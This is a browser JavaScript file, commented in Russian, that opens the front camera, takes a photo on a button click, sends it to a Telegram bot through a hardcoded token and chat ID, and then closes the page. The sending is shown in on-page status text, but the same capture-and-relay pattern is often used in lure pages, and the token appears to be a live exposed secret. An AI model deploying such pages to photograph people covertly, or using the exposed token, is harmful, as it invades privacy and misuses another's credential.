// НАСТРОЙКА: Вставь свои данные
const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424'; // Замени на токен от BotFather
const CHAT_ID = '8244138604'; // Замени на свой chat ID

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('captureBtn');
const statusDiv = document.getElementById('status');

let stream = null;

// Запуск камеры
async function initCamera() {
    try {
        // Пробуем включить фронтальную камеру
        const constraints = {
            video: {
                facingMode: { exact: "user" },
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        };
        
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        statusDiv.innerHTML = '✅ Камера готова';
        statusDiv.className = 'status success';
        await video.play();
        
    } catch (error) {
        // Если не получилось, пробуем без exact
        try {
            const fallbackConstraints = {
                video: {
                    facingMode: "user",
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            };
            stream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
            video.srcObject = stream;
            await video.play();
            statusDiv.innerHTML = '✅ Камера готова';
            statusDiv.className = 'status success';
        } catch (fallbackError) {
            statusDiv.innerHTML = '❌ Ошибка доступа к камере';
            statusDiv.className = 'status error';
            captureBtn.disabled = true;
        }
    }
}

// Отправка фото в Telegram
async function sendToTelegram(photoBase64) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    
    // Конвертируем base64 в blob
    const byteString = atob(photoBase64.split(',')[1]);
    const mimeString = photoBase64.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    
    const blob = new Blob([ab], { type: mimeString });
    
    // Создаем FormData для отправки
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', '📸 Снимок с фронтальной камеры');
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Ошибка отправки:', error);
        return false;
    }
}

// Сделать снимок
async function capturePhoto() {
    if (!stream) {
        statusDiv.innerHTML = '❌ Камера не инициализирована';
        return;
    }
    
    statusDiv.innerHTML = '📷 Съемка...';
    
    // Настраиваем canvas под размер видео
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    // Рисуем кадр на canvas
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Получаем фото в формате JPEG
    const imageData = canvas.toDataURL('image/jpeg', 0.9);
    
    statusDiv.innerHTML = '📤 Отправка в Telegram...';
    
    // Отправляем фото
    const success = await sendToTelegram(imageData);
    
    if (success) {
        statusDiv.innerHTML = '✅ Фото успешно отправлено!';
        statusDiv.className = 'status success';
        
        // Закрываем страницу через 2 секунды
        setTimeout(() => {
            if (window.close) {
                window.close();
            }
        }, 2000);
    } else {
        statusDiv.innerHTML = '❌ Ошибка отправки фото';
        statusDiv.className = 'status error';
    }
}

// Останавливаем камеру при закрытии страницы
window.addEventListener('beforeunload', () => {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
});

// Запускаем все при загрузке
initCamera();
captureBtn.addEventListener('click', capturePhoto);
